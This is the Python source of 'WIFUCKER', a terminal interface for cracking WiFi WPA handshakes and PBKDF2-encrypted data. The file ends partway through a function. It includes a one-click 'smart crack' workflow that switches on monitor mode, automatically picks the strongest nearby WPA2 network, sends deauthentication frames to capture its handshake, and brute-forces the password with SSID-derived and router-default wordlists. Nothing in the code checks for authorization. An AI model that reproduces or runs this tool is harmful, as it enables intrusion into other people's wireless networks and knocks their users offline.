#!/usr/bin/env python3
"""
WIFUCKER Unified TUI - Next Generation
========================================
Integrated WiFi + PBKDF2 password cracking interface
Supports: WiFi WPA cracking, PBKDF2 dictionary attacks, steganography

Features:
- Multi-tab interface (WiFi, PBKDF2, Tools, Reports)
- Real-time progress monitoring
- Hardware acceleration detection (NPU, NCS2, GPU)
- Integration with rockyou wordlist
- Context-aware password generation
- Multi-threaded cracking engine
"""

import sys
from pathlib import Path

# Check if running directly without venv
try:
    from textual.app import App, ComposeResult
except ImportError:
    script_dir = Path(__file__).parent
    venv_python = script_dir / "venv" / "bin" / "python3"

    if venv_python.exists():
        print("=" * 60)
        print("ERROR: Missing dependencies detected")
        print("=" * 60)
        print(f"\nPlease use the launcher script instead:")
        print(f"  {script_dir}/wifucker")
        print(f"\nOr activate the virtual environment first:")
        print(f"  source {script_dir}/venv/bin/activate")
        print(f"  python3 {Path(__file__).name}")
        print("\nIf you need sudo, use:")
        print(f"  sudo -E {script_dir}/wifucker")
        print("=" * 60)
        sys.exit(1)
    else:
        print("ERROR: textual module not found and venv not detected")
        print("Please run the launcher: ./wifucker")
        sys.exit(1)

from textual.app import App, ComposeResult, Binding
from textual.containers import Horizontal, Vertical, Container, ScrollableContainer
from textual.widgets import (
    Header, Footer, Button, Static, Input, Label, Log, RichLog,
    TabbedContent, TabPane, Switch, RadioSet, RadioButton, DirectoryTree, DataTable
)
from textual.screen import ModalScreen
from textual import on
from textual.binding import Binding
from textual.message import Message
from typing import Optional, Callable, Tuple, List, Dict
import threading
import asyncio
import os
from rich.text import Text
import subprocess

ROOT_DIR = Path(__file__).parent
SCRIPTS_DIR = ROOT_DIR / "scripts"
VENV_PYTHON = ROOT_DIR / "venv" / "bin" / "python3"
PYTHON_BIN = str(VENV_PYTHON if VENV_PYTHON.exists() else sys.executable)
DSMIL_ROOT = ROOT_DIR.parent.parent

# Import PBKDF2 cracker modules
from .crackers import (
    PBKDF2Cracker, CrackingResult, MutationEngine, ContextWordlistGenerator
)


class MarkupLog(RichLog):
    """Log widget that always treats string input as rich markup."""
    # RichLog already handles markup strings and Rich renderables natively,
    # so we can use it directly without custom conversion logic


def detect_package_manager():
    """
    Detect which package manager is available on the system.
    
    Returns:
        str: Package manager name ('apt', 'dnf', 'yum', 'pacman', 'zypper', 'emerge')
             or None if none detected
    """
    import shutil
    
    if shutil.which('apt'):
        return 'apt'
    elif shutil.which('dnf'):
        return 'dnf'
    elif shutil.which('yum'):
        return 'yum'
    elif shutil.which('pacman'):
        return 'pacman'
    elif shutil.which('zypper'):
        return 'zypper'
    elif shutil.which('emerge'):
        return 'emerge'
    return None


def install_tools_auto(tools: list, log_callback=None) -> bool:
    """
    Automatically install missing tools
    
    Args:
        tools: List of tool names to check/install
        log_callback: Optional callback function for logging (takes string message)
    
    Returns:
        True if all tools are now available, False otherwise
    """
    import os
    import subprocess
    import shutil
    
    def log(msg):
        if log_callback:
            log_callback(msg)
        else:
            print(msg)
    
    # Check which tools are missing
    missing_tools = []
    for tool in tools:
        if not shutil.which(tool):
            missing_tools.append(tool)
    
    if not missing_tools:
        return True  # All tools available
    
    # Check if we have root
    if os.geteuid() != 0:
        log("[yellow]Root privileges required to install tools[/]")
        log("[cyan]Please run with: sudo -E ./wifucker[/]")
        return False
    
    # Detect package manager
    pkg_manager = detect_package_manager()
    if not pkg_manager:
        log("[red]Could not detect package manager[/]")
        log("[yellow]Please install tools manually:[/]")
        log("  aircrack-ng (provides airodump-ng)")
        log("  iw")
        return False
    
    # Map tools to packages
    tool_to_package = {
        'airodump-ng': 'aircrack-ng',
        'iw': 'iw',
        'iwconfig': 'wireless-tools',
    }
    
    # Determine packages to install
    packages_to_install = []
    for tool in missing_tools:
        package = tool_to_package.get(tool, tool)
        if package not in packages_to_install:
            packages_to_install.append(package)
    
    if not packages_to_install:
        return False
    
    # Build install command based on package manager
    if pkg_manager == 'apt':
        cmd = ['apt', 'install', '-y'] + packages_to_install
    elif pkg_manager == 'dnf':
        cmd = ['dnf', 'install', '-y'] + packages_to_install
    elif pkg_manager == 'yum':
        cmd = ['yum', 'install', '-y'] + packages_to_install
    elif pkg_manager == 'pacman':
        cmd = ['pacman', '-S', '--noconfirm'] + packages_to_install
    elif pkg_manager == 'zypper':
        cmd = ['zypper', 'install', '-y'] + packages_to_install
    elif pkg_manager == 'emerge':
        cmd = ['emerge', '--quiet-build'] + packages_to_install
    else:
        log(f"[red]Unsupported package manager: {pkg_manager}[/]")
        return False
    
    # Attempt installation
    log(f"[cyan]Installing missing tools: {', '.join(packages_to_install)}...[/]")
    log(f"[yellow]Using package manager: {pkg_manager}[/]")
    
    try:
        result = subprocess.run(
            cmd,
            capture_output=True,
            text=True,
            timeout=300  # 5 minute timeout
        )
        
        if result.returncode == 0:
            log(f"[green]✓ Successfully installed: {', '.join(packages_to_install)}[/]")
            
            # Verify tools are now available
            all_available = True
            for tool in tools:
                if not shutil.which(tool):
                    log(f"[yellow]Warning: {tool} still not found after installation[/]")
                    all_available = False
            
            return all_available
        else:
            log(f"[red]Installation failed:[/]")
            log(f"[red]{result.stderr}[/]")
            return False
            
    except subprocess.TimeoutExpired:
        log("[red]Installation timed out[/]")
        return False
    except Exception as e:
        log(f"[red]Installation error: {e}[/]")
        return False


class ProgressMonitor(Static):
    """Realtime progress display"""

    def __init__(self, **kwargs):
        super().__init__(**kwargs)
        self.total = 0
        self.tested = 0
        self.rate = 0.0
        self.status = "Ready"

    def render(self):
        """Render progress information"""
        if self.total == 0:
            return f"[cyan]Status:[/] {self.status}"

        percent = (self.tested / self.total * 100) if self.total > 0 else 0
        bar_length = 30
        filled = int(bar_length * percent / 100)
        bar = "█" * filled + "░" * (bar_length - filled)

        return f"""[cyan]Status:[/] {self.status}
[yellow]Progress:[/] [{bar}] {percent:.1f}%
[green]Tested:[/] {self.tested:,} / {self.total:,}
[magenta]Rate:[/] {self.rate:,.0f} passwords/sec"""

    def update_progress(self, tested: int, total: int, percent: float, rate: float):
        """Update progress"""
        self.tested = tested
        self.total = total
        self.rate = rate
        self.refresh()

    def set_status(self, status: str):
        """Update status"""
        self.status = status
        self.refresh()


class IntelligenceToolsTab(Container):
    """Intelligence Tools - Intel Integration, Hardware Status, Advanced Features"""

    def compose(self) -> ComposeResult:
        yield Vertical(
            # Header
            Label("[bold white]Intelligence & Tools[/]"),

            # Intel Status Section
            Label("[cyan]DSMIL Intelligence Status:[/]"),
            Horizontal(
                Static("🧠 Strategic AI: Checking...", id="strategic_ai_status", classes="status-indicator"),
                Static("🔍 Anomaly Detection: Checking...", id="anomaly_status", classes="status-indicator"),
                Static("🎯 Attack Patterns: Checking...", id="attack_pattern_status", classes="status-indicator"),
                Static("🕵️ IOC Extraction: Checking...", id="ioc_status", classes="status-indicator"),
            ),

            # Hardware Acceleration Status
            Label("[cyan]Hardware Acceleration:[/]"),
            Horizontal(
                Static("🧮 NPU: Checking...", id="npu_status", classes="status-indicator"),
                Static("🎮 GPU: Checking...", id="gpu_status", classes="status-indicator"),
                Static("⚡ AVX-512: Checking...", id="avx_status", classes="status-indicator"),
                Static("🧠 OpenVINO: Checking...", id="openvino_status", classes="status-indicator"),
            ),

            # Main Tools Section
            Horizontal(
                Button("🔍 Analyze SSID", id="analyze_ssid", variant="primary",
                      tooltip="Analyze target SSID for router type detection and password patterns"),
                Button("📝 Generate Wordlist", id="generate_intel_wordlist", variant="success",
                      tooltip="Create custom wordlist based on SSID analysis and intelligence"),
                Button("🧪 Test PBKDF2", id="test_pbkdf2", variant="warning",
                      tooltip="Test PBKDF2 cracking performance with sample data"),
                Button("🚀 Intel-Enhanced Crack", id="intel_crack", variant="error",
                      tooltip="Crack with DSMIL intelligence, AI patterns, and hardware acceleration"),
                Button("🪄 SMART CRACK WORKFLOW", id="smart_workflow", variant="success",
                      tooltip="One-click automated cracking: scan→capture→crack with full intelligence"),
                Button("🔧 System Tools", id="system_tools", tooltip="System maintenance, diagnostics, and testing tools"),
            ),

            # Router Cracking Section
            Label("[cyan]Router Password Cracking:[/]"),
            Horizontal(
                Button("🔐 Router Hex Mode (10-digit)", id="router_hex_mode", variant="primary",
                      tooltip="Brute force technical device passwords: 10-digit hex (a-f, 0-9) for routers, IoT, network equipment"),
                Button("📱 EE WiFi Mode (12-14 digits)", id="ee_wifi_mode", variant="success",
                      tooltip="Crack EE/BT Smart Hub default passwords: sequential/repeated patterns, 12-14 digits"),
                Button("🌐 Auto Router Detect", id="auto_router_detect", variant="warning",
                      tooltip="Analyze SSID to auto-detect router type and generate appropriate wordlist"),
                Button("🎯 Router Wordlist Gen", id="router_wordlist_gen", variant="error",
                      tooltip="Generate custom router password wordlists"),
            ),

            # Intelligence Analysis Panel
            Vertical(
                Label("[yellow]Intelligence Analysis:[/]"),
                Input(id="ssid_input", placeholder="Enter SSID for analysis",
                      tooltip="Enter network SSID for intelligent analysis"),
                Static("", id="ssid_analysis", markup=True),
                id="intel_panel"
            ),

            # PBKDF2 Testing Panel
            Vertical(
                Label("[yellow]PBKDF2 Testing:[/]"),
                Input(id="pbkdf2_data", placeholder="base64(salt)|base64(ciphertext)",
                      tooltip="Paste encrypted data for testing"),
                RadioSet(
                    RadioButton("Dictionary Attack", id="dict_mode"),
                    RadioButton("Pattern Generation", id="pattern_mode"),
                    RadioButton("Intel-Enhanced", id="intel_mode"),
                    id="pbkdf2_strategy"
                ),
                Button("🚀 Test Crack", id="start_pbkdf2_test", variant="error"),
                id="pbkdf2_panel"
            ),

            # Tools and Utilities
            Vertical(
                Label("[yellow]System Tools:[/]"),
                Horizontal(
                    Button("📊 Hardware Benchmark", id="benchmark_hardware"),
                    Button("🔄 Refresh Status", id="refresh_intel_status"),
                    Button("📁 Download Wordlists", id="download_wordlists"),
                    Button("⚙️ Configuration", id="configure_system"),
                ),
                id="tools_panel"
            ),

            # Results and Logs
            Label("[green]Intelligence Results:[/]"),
            MarkupLog(id="intel_log", highlight=True, max_lines=1000),

            id="intel_container"
        )

    def on_mount(self) -> None:
        """Initialize the intelligence tab"""
        self.refresh_intel_status()

    def on_button_pressed(self, event: Button.Pressed) -> None:
        """Handle button presses"""
        log = self.query_one("#intel_log", MarkupLog)

        if event.button.id == "analyze_ssid":
            self.analyze_ssid()
        elif event.button.id == "generate_intel_wordlist":
            self.generate_intel_wordlist()
        elif event.button.id == "test_pbkdf2":
            self.test_pbkdf2_cracking()
        elif event.button.id == "start_pbkdf2_test":
            self.start_pbkdf2_test()
        elif event.button.id == "benchmark_hardware":
            self.benchmark_hardware()
        elif event.button.id == "refresh_intel_status":
            self.refresh_intel_status()
        elif event.button.id == "download_wordlists":
            self.download_wordlists()
        elif event.button.id == "configure_system":
            self.configure_system()
        elif event.button.id == "intel_crack":
            self.start_intel_enhanced_cracking()
        elif event.button.id == "smart_workflow":
            self.start_smart_crack_workflow()
        elif event.button.id == "router_hex_mode":
            self.start_router_hex_cracking()
        elif event.button.id == "ee_wifi_mode":
            self.start_ee_wifi_cracking()
        elif event.button.id == "auto_router_detect":
            self.start_auto_router_detect()
        elif event.button.id == "router_wordlist_gen":
            self.generate_router_wordlist()

    def analyze_ssid(self):
        """Analyze SSID for intelligence"""
        ssid_input = self.query_one("#ssid_input", Input)
        analysis_display = self.query_one("#ssid_analysis", Static)
        log = self.query_one("#intel_log", MarkupLog)

        ssid = ssid_input.value.strip()
        if not ssid:
            log.write("[red]Error: Please enter an SSID to analyze[/]")
            return

        log.write(f"[cyan]Analyzing SSID: {ssid}[/]")

        try:
            from .ai_models.wordlist_generator import AIWordlistGenerator
            generator = AIWordlistGenerator()
            analysis = generator.analyze_ssid(ssid)

            # Format analysis for display
            analysis_text = f"""[cyan]SSID Intelligence Analysis:[/]

[yellow]📊 Basic Info:[/]
  SSID: {analysis['ssid']}
  Length: {analysis['length']} chars
  Contains Numbers: {'Yes' if analysis['has_numbers'] else 'No'}
  Contains Special: {'Yes' if analysis['has_special'] else 'No'}

[yellow]🔤 Extracted Words:[/] {', '.join(analysis['words']) if analysis['words'] else 'None'}
[yellow]🔢 Extracted Numbers:[/] {', '.join(analysis['numbers']) if analysis['numbers'] else 'None'}
[yellow]🏢 Likely Brand:[/] {analysis['likely_brand'] if analysis['likely_brand'] else 'Unknown'}
[yellow]📋 Pattern Type:[/] {analysis['pattern_type']}

[green]✓ Analysis complete - Intelligence gathered for wordlist generation[/]"""

            analysis_display.update(analysis_text)
            log.write("[green]✓ SSID analysis complete[/]")

        except Exception as e:
            log.write(f"[red]Error analyzing SSID: {e}[/]")
            analysis_display.update("[red]Analysis failed[/]")

    def generate_intel_wordlist(self):
        """Generate intelligent wordlist using DSMIL intel"""
        log = self.query_one("#intel_log", MarkupLog)
        ssid_input = self.query_one("#ssid_input", Input)

        ssid = ssid_input.value.strip() or "default_network"
        log.write(f"[cyan]Generating intel-enhanced wordlist for SSID: {ssid}[/]")

        try:
            from .ai_models.wordlist_generator import AIWordlistGenerator
            generator = AIWordlistGenerator()

            # Generate wordlist with enhanced intel (location, temporal, social engineering)
            wordlist = generator.generate(ssid, max_passwords=25000, use_dsmil_intel=True)

            # Save to file
            output_file = ROOT_DIR / f"wordlist_intel_{ssid}.txt"
            with open(output_file, 'w') as f:
                f.write('\n'.join(wordlist))

            log.write(f"[green]✓ Generated {len(wordlist):,} passwords using enhanced DSMIL intelligence[/]")
            log.write(f"[cyan]  Features: SSID analysis, location patterns, temporal patterns, social engineering[/]")
            log.write(f"[green]✓ Wordlist saved to: {output_file}[/]")

            # Show sample
            if wordlist:
                log.write("[cyan]Sample passwords:[/]")
                for pwd in wordlist[:10]:
                    log.write(f"  {pwd}")

        except Exception as e:
            log.write(f"[red]Error generating wordlist: {e}[/]")

    def test_pbkdf2_cracking(self):
        """Test PBKDF2 cracking functionality"""
        log = self.query_one("#intel_log", MarkupLog)
        log.write("[cyan]Testing PBKDF2 cracking functionality...[/]")

        try:
            from crackers import PBKDF2Cracker
            # Test with sample data
            test_data = "dGVzdCBzYWx0|dGVzdCBjaXBoZXI="  # base64("test salt")|base64("test cipher")
            test_password = "test123"

            cracker = PBKDF2Cracker(test_data)
            result = cracker.crack_dictionary([test_password])

            if result.success and result.password == test_password:
                log.write("[green]✓ PBKDF2 cracking test PASSED[/]")
                log.write(f"[cyan]✓ Correctly found password: {result.password}[/]")
            else:
                log.write("[red]✗ PBKDF2 cracking test FAILED[/]")
                log.write(f"[yellow]Expected: {test_password}, Got: {result.password if result.success else 'None'}[/]")

        except Exception as e:
            log.write(f"[red]PBKDF2 test error: {e}[/]")

    def start_pbkdf2_test(self):
        """Start PBKDF2 cracking test"""
        log = self.query_one("#intel_log", MarkupLog)
        data_input = self.query_one("#pbkdf2_data", Input)
        strategy_radio = self.query_one("#pbkdf2_strategy", RadioSet)

        test_data = data_input.value.strip()
        if not test_data:
            log.write("[red]Error: Please enter test data[/]")
            return

        strategy = strategy_radio.pressed.id if strategy_radio.pressed else "intel_mode"
        log.write(f"[cyan]Starting PBKDF2 test with {strategy} strategy...[/]")

        # Run test in background thread
        threading.Thread(
            target=self._run_pbkdf2_test,
            args=(test_data, strategy, log),
            daemon=True
        ).start()

    def _run_pbkdf2_test(self, test_data: str, strategy: str, log):
        """Run PBKDF2 test in background"""
        try:
            from crackers import PBKDF2Cracker, ContextWordlistGenerator

            # Generate test wordlist based on strategy
            if strategy == "intel_mode":
                wordlist = ContextWordlistGenerator.generate_with_mutations(1000)
                log.write(f"[cyan]Using intel-enhanced wordlist ({len(wordlist)} passwords)[/]")
            elif strategy == "pattern_mode":
                wordlist = ContextWordlistGenerator.generate(1000)
                log.write(f"[cyan]Using pattern-generated wordlist ({len(wordlist)} passwords)[/]")
            else:  # dict_mode
                wordlist = ["password", "12345678", "admin", "test", "wifi123", "network"]
                log.write(f"[cyan]Using basic dictionary ({len(wordlist)} passwords)[/]")

            cracker = PBKDF2Cracker(test_data)

            def progress_callback(tested, total, percent, rate):
                if tested % 50 == 0:
                    log.write(f"[cyan]Tested: {tested}/{total} ({percent:.1f}%) - {rate:.0f} pwd/sec[/]")

            result = cracker.crack_dictionary(wordlist, progress_callback=progress_callback)

            if result.success:
                log.write(f"[green]✓ SUCCESS! Password found: {result.password}[/]")
                log.write(f"[cyan]Attempts: {result.attempts}, Time: {result.elapsed_time:.2f}s[/]")
            else:
                log.write("[yellow]Password not found in test wordlist[/]")
                log.write(f"[cyan]Tested: {result.attempts} passwords in {result.elapsed_time:.2f}s[/]")

        except Exception as e:
            log.write(f"[red]PBKDF2 test failed: {e}[/]")

    def benchmark_hardware(self):
        """Benchmark hardware acceleration"""
        log = self.query_one("#intel_log", MarkupLog)
        log.write("[cyan]Running hardware benchmark...[/]")

        try:
            from scripts.check_tops import check_accelerator_performance
            results = check_accelerator_performance()

            log.write("[green]Hardware Benchmark Results:[/]")
            for component, performance in results.items():
                log.write(f"  [cyan]{component}:[/] {performance}")

        except Exception as e:
            log.write(f"[red]Benchmark failed: {e}[/]")
            log.write("[yellow]Try running: python3 scripts/check_tops.py[/]")

    def download_wordlists(self):
        """Download additional wordlists"""
        log = self.query_one("#intel_log", MarkupLog)
        log.write("[cyan]Downloading additional wordlists...[/]")

        # This would download various wordlists
        wordlists = [
            "https://example.com/wordlist1.txt",
            "https://example.com/wordlist2.txt"
        ]

        log.write("[yellow]Wordlist download not yet implemented[/]")
        log.write("[cyan]Available wordlists:[/]")
        for wl in wordlists:
            log.write(f"  {wl}")

    def configure_system(self):
        """Configure system settings"""
        log = self.query_one("#intel_log", MarkupLog)
        log.write("[cyan]Opening system configuration...[/]")

        # This could open a configuration dialog or run setup scripts
        log.write("[yellow]System configuration UI not yet implemented[/]")
        log.write("[cyan]Available configuration options:[/]")
        log.write("  • Hardware acceleration settings")
        log.write("  • Intel model selection")
        log.write("  • Wordlist generation parameters")
        log.write("  • Security clearance settings")

    def start_intel_enhanced_cracking(self):
        """Start intel-enhanced WPA cracking"""
        log = self.query_one("#intel_log", MarkupLog)

        # Get PCAP file from WiFi tab
        try:
            wifi_tab = self.app.query_one("#wifi_container", WiFiOperationsTab)
            pcap_input = wifi_tab.query_one("#pcap_file", Input)
            pcap_file = pcap_input.value.strip()
        except:
            pcap_file = ""

        if not pcap_file:
            log.write("[red]Error: No PCAP file specified. Capture handshake first in WiFi tab.[/]")
            return

        if not Path(pcap_file).exists():
            log.write(f"[red]Error: PCAP file not found: {pcap_file}[/]")
            return

        log.write("[cyan]Starting intel-enhanced WPA cracking...[/]")
        log.write(f"[cyan]PCAP file: {pcap_file}[/]")
        log.write("[green]Layer 9 (QUANTUM) clearance: ACTIVE[/]")
        log.write("[cyan]Integrating DSMIL intelligence...[/]")

        # Run intel-enhanced cracking in background
        threading.Thread(
            target=self._run_intel_cracking,
            args=(pcap_file, log),
            daemon=True
        ).start()

    def _run_intel_cracking(self, pcap_file: str, log):
        """Run intel-enhanced cracking"""
        try:
            from crackers import IntelEnhancedCracker
            from .parsers.pcap_parser import PCAPParser

            # Parse PCAP
            log.write("[cyan]Parsing PCAP file...[/]")
            parser = PCAPParser(pcap_file)
            handshakes, pmkids = parser.parse()

            if not handshakes:
                log.write("[red]No handshakes found in PCAP file[/]")
                return

            log.write(f"[green]Found {len(handshakes)} handshake(s)[/]")

            # Initialize intel-enhanced cracker
            log.write("[cyan]Initializing intel-enhanced cracker...[/]")
            cracker = IntelEnhancedCracker(use_hardware=True, enable_quantum=True)

            # Process each handshake
            for i, hs in enumerate(handshakes[:3]):  # Limit to first 3
                log.write(f"[cyan]Processing handshake {i+1}: {hs.ssid} ({hs.bssid})[/]")

                # Progress callback
                def progress_callback(tested, total, percent, rate):
                    if tested % 1000 == 0:
                        log.write(f"[cyan]Tested: {tested:,}/{total:,} ({percent:.1f}%) - {rate:,.0f} pwd/sec[/]")

                # Crack with intelligence
                result = cracker.crack_handshake(
                    ssid=hs.ssid,
                    anonce=hs.anonce,
                    snonce=hs.snonce,
                    mic=hs.mic,
                    bssid=hs.bssid,
                    client=hs.client,
                    wordlist_file=None,  # Use intel-generated
                    progress_callback=progress_callback,
                    intel_boost=True
                )

                if result.success:
                    log.write(f"[bold green]✓ SUCCESS![/]")
                    log.write(f"[green]Password: {result.password}[/]")
                    log.write(f"[cyan]Intelligence confidence: {result.intel_confidence:.1%}[/]")
                    if result.attack_patterns_used:
                        log.write(f"[cyan]Attack patterns: {', '.join(result.attack_patterns_used[:3])}[/]")
                    log.write(f"[cyan]Attempts: {result.attempts:,}[/]")
                    log.write(f"[cyan]Time: {result.elapsed_time:.2f}s[/]")
                    break
                else:
                    log.write(f"[yellow]Handshake {i+1} not cracked[/]")
                    log.write(f"[cyan]Tested: {result.attempts:,} passwords[/]")

            # Show intel stats
            stats = cracker.get_intel_stats()
            log.write("[cyan]Intelligence session complete:[/]")
            log.write(f"  Total attempts: {stats['total_attempts']:,}")
            log.write(f"  Intel hits: {stats['intel_hits']}")
            log.write(f"  Hit rate: {stats['hit_rate']:.1%}")
            log.write(f"  Cached intelligence: {stats['cached_intel']}")

        except Exception as e:
            log.write(f"[red]Intel-enhanced cracking failed: {e}[/]")
            import traceback
            log.write(f"[red]{traceback.format_exc()}[/]")

    def refresh_intel_status(self):
        """Refresh intelligence and hardware status"""
        log = self.query_one("#intel_log", MarkupLog)

        # Check DSMIL intelligence components
        try:
            # Strategic AI LLM
            strategic_ai_path = DSMIL_ROOT / "models" / "strategic_ai_llm"
            if strategic_ai_path.exists():
                self.query_one("#strategic_ai_status", Static).update("[green]🧠 Strategic AI: ✓ Available[/]")
            else:
                self.query_one("#strategic_ai_status", Static).update("[yellow]🧠 Strategic AI: ⚠ Not Found[/]")

            # Anomaly Detection
            anomaly_path = DSMIL_ROOT / "models" / "anomaly_detector"
            if anomaly_path.exists():
                self.query_one("#anomaly_status", Static).update("[green]🔍 Anomaly Detection: ✓ Available[/]")
            else:
                self.query_one("#anomaly_status", Static).update("[yellow]🔍 Anomaly Detection: ⚠ Not Found[/]")

            # Attack Pattern Recognition
            attack_path = DSMIL_ROOT / "models" / "attack_pattern"
            if attack_path.exists():
                self.query_one("#attack_pattern_status", Static).update("[green]🎯 Attack Patterns: ✓ Available[/]")
            else:
                self.query_one("#attack_pattern_status", Static).update("[yellow]🎯 Attack Patterns: ⚠ Not Found[/]")

            # IOC Extraction
            ioc_path = DSMIL_ROOT / "models" / "ioc_extraction_nlp"
            if ioc_path.exists():
                self.query_one("#ioc_status", Static).update("[green]🕵️ IOC Extraction: ✓ Available[/]")
            else:
                self.query_one("#ioc_status", Static).update("[yellow]🕵️ IOC Extraction: ⚠ Not Found[/]")

        except Exception as e:
            log.write(f"[red]Error checking intel components: {e}[/]")

        # Check hardware acceleration
        try:
            # NPU status
            npu_path = ROOT_DIR / "HW" / "NPU"
            if npu_path.exists():
                self.query_one("#npu_status", Static).update("[green]🧮 NPU: ✓ Available[/]")
            else:
                self.query_one("#npu_status", Static).update("[yellow]🧮 NPU: ⚠ Not Found[/]")

            # GPU status (check for OpenVINO or CUDA)
            gpu_available = False
            try:
                import subprocess
                result = subprocess.run(["nvidia-smi"], capture_output=True, timeout=5)
                if result.returncode == 0:
                    gpu_available = True
            except:
                pass

            if gpu_available:
                self.query_one("#gpu_status", Static).update("[green]🎮 GPU: ✓ Available[/]")
            else:
                self.query_one("#gpu_status", Static).update("[yellow]🎮 GPU: ⚠ Not Available[/]")

            # AVX-512 status
            try:
                import subprocess
                result = subprocess.run(["grep", "avx512", "/proc/cpuinfo"], capture_output=True, timeout=5)
                if result.returncode == 0:
                    self.query_one("#avx_status", Static).update("[green]⚡ AVX-512: ✓ Available[/]")
                else:
                    self.query_one("#avx_status", Static).update("[yellow]⚡ AVX-512: ⚠ Not Available[/]")
            except:
                self.query_one("#avx_status", Static).update("[yellow]⚡ AVX-512: ⚠ Check Failed[/]")

            # OpenVINO status
            try:
                from openvino import Core
                core = Core()
                devices = core.available_devices
                if devices:
                    self.query_one("#openvino_status", Static).update(f"[green]🧠 OpenVINO: ✓ {len(devices)} device(s)[/]")
                else:
                    self.query_one("#openvino_status", Static).update("[yellow]🧠 OpenVINO: ⚠ No Devices[/]")
            except ImportError:
                self.query_one("#openvino_status", Static).update("[red]🧠 OpenVINO: ✗ Not Installed[/]")
            except Exception as e:
                self.query_one("#openvino_status", Static).update("[yellow]🧠 OpenVINO: ⚠ Check Failed[/]")

        except Exception as e:
            log.write(f"[red]Error checking hardware: {e}[/]")

        log.write("[green]✓ Intelligence and hardware status refreshed[/]")

    def start_smart_crack_workflow(self):
        """One-click smart cracking workflow"""
        log = self.query_one("#intel_log", MarkupLog)
        monitor = self.query_one("#intel_progress", ProgressMonitor)

        log.write("[bold cyan]🚀 STARTING SMART CRACK WORKFLOW[/]")
        log.write("[cyan]This will automatically:[/]")
        log.write("  1. 🔍 Scan for networks")
        log.write("  2. 🎯 Select best WPA2 target")
        log.write("  3. 📡 Capture handshake")
        log.write("  4. 🧠 Generate intel-enhanced wordlist")
        log.write("  5. ⚡ Crack with hardware acceleration")
        log.write("")

        # Run smart workflow in background
        threading.Thread(
            target=self._smart_crack_worker,
            args=(log, monitor),
            daemon=True
        ).start()

    def _smart_crack_worker(self, log, monitor):
        """Smart cracking workflow worker"""
        try:
            # Step 1: Auto-scan networks
            log.write("[cyan]Step 1: Scanning for networks...[/]")
            monitor.set_status("Scanning networks...")

            interfaces = self._get_wireless_interfaces()
            if not interfaces:
                log.write("[red]❌ No wireless interfaces found[/]")
                monitor.set_status("No interfaces")
                return

            interface = interfaces[0]
            log.write(f"[green]✓ Using interface: {interface}[/]")

            # Enable monitor mode if needed
            from .capture.monitor_mode import MonitorMode
            monitor_mode = MonitorMode()
            if not monitor_mode.is_in_monitor_mode(interface):
                success, message, mon_iface = monitor_mode.enable_monitor_mode(interface)
                if success:
                    interface = mon_iface
                    log.write(f"[green]✓ Monitor mode enabled: {interface}[/]")
                else:
                    log.write(f"[yellow]⚠ Monitor mode failed: {message}[/]")

            # Scan networks
            from .capture.network_scanner import NetworkScanner
            scanner = NetworkScanner(interface)
            networks = scanner.scan(duration=15)

            if not networks:
                log.write("[red]❌ No networks found[/]")
                monitor.set_status("No networks")
                return

            # Step 2: Auto-select best WPA2 target
            log.write("[cyan]Step 2: Selecting best target...[/]")
            wpa_networks = [n for n in networks if "WPA" in n.encryption]

            if not wpa_networks:
                log.write("[red]❌ No WPA/WPA2 networks found[/]")
                monitor.set_status("No WPA networks")
                return

            # Select strongest WPA2 network
            best_target = max(wpa_networks, key=lambda x: x.power)
            log.write(f"[green]✓ Selected target: {best_target.essid} ({best_target.bssid})[/]")
            log.write(f"[cyan]  Signal: {best_target.power}dBm, Encryption: {best_target.encryption}[/]")

            # Step 3: Auto-capture handshake
            log.write("[cyan]Step 3: Capturing handshake...[/]")
            monitor.set_status("Capturing handshake...")

            from .capture.handshake_capture import HandshakeCapture
            output_dir = Path("./captures")
            output_dir.mkdir(exist_ok=True)

            capture = HandshakeCapture(interface=interface, output_dir=str(output_dir))
            result = capture.capture_handshake(
                target=best_target,
                capture_duration=45,
                deauth_count=10
            )

            if result and result.success:
                log.write(f"[green]✓ Handshake captured: {result.pcap_file}[/]")
                log.write(f"[cyan]  Duration: {result.duration:.1f}s, Handshakes: {result.handshakes_captured}[/]")
            else:
                log.write("[red]❌ Handshake capture failed[/]")
                monitor.set_status("Capture failed")
                return

            # Step 4: Generate intel-enhanced wordlist
            log.write("[cyan]Step 4: Generating intel-enhanced wordlist...[/]")
            monitor.set_status("Generating wordlist...")

            from .ai_models.wordlist_generator import AIWordlistGenerator
            generator = AIWordlistGenerator()
            wordlist = generator.generate(
                ssid=best_target.essid,
                max_passwords=25000,
                use_dsmil_intel=True
            )

            wordlist_file = ROOT_DIR / f"smart_wordlist_{best_target.essid}.txt"
            with open(wordlist_file, 'w') as f:
                f.write('\n'.join(wordlist))

            log.write(f"[green]✓ Generated {len(wordlist):,} intel-enhanced passwords[/]")

            # Step 5: Auto-crack
            log.write("[cyan]Step 5: Starting hardware-accelerated cracking...[/]")
            monitor.set_status("Cracking with intel...")

            from crackers import IntelEnhancedCracker
            cracker = IntelEnhancedCracker(use_hardware=True, enable_quantum=True)

            # Parse the captured PCAP
            from .parsers.pcap_parser import PCAPParser
            parser = PCAPParser(result.pcap_file)
            handshakes, pmkids = parser.parse()

            if not handshakes:
                log.write("[red]❌ No handshakes found in captured PCAP[/]")
                return

            target_hs = handshakes[0]

            def progress_callback(tested, total, percent, rate):
                if tested % 1000 == 0:
                    monitor.update_progress(tested, total, percent, rate)
                    log.write(f"[cyan]Progress: {tested:,}/{total:,} ({percent:.1f}%) - {rate:,.0f} pwd/sec[/]")

            crack_result = cracker.crack_handshake(
                ssid=target_hs.ssid,
                anonce=target_hs.anonce,
                snonce=target_hs.snonce,
                mic=target_hs.mic,
                bssid=target_hs.bssid,
                client=target_hs.client,
                wordlist_file=str(wordlist_file),
                progress_callback=progress_callback,
                intel_boost=True
            )

            if crack_result.success:
                log.write(f"[bold green]🎉 SUCCESS! Password found: {crack_result.password}[/]")
                log.write(f"[cyan]Intelligence confidence: {crack_result.intel_confidence:.1%}[/]")
                log.write(f"[cyan]Attempts: {crack_result.attempts:,}[/]")
                log.write(f"[cyan]Time: {crack_result.elapsed_time:.2f}s[/]")
                monitor.set_status(f"CRACKED: {crack_result.password}")
            else:
                log.write("[yellow]❌ Password not found in generated wordlist[/]")
                log.write(f"[cyan]Tested: {crack_result.attempts:,} passwords[/]")
                monitor.set_status("Not found")

            log.write("[bold green]✓ SMART CRACK WORKFLOW COMPLETE[/]")

        except Exception as e:
            log.write(f"[red]❌ Smart crack workflow failed: {e}[/]")
            monitor.set_status("Workflow failed")
            import traceback
            log.write(f"[red]{traceback.format_exc()}[/]")

    def _get_wireless_interfaces(self):
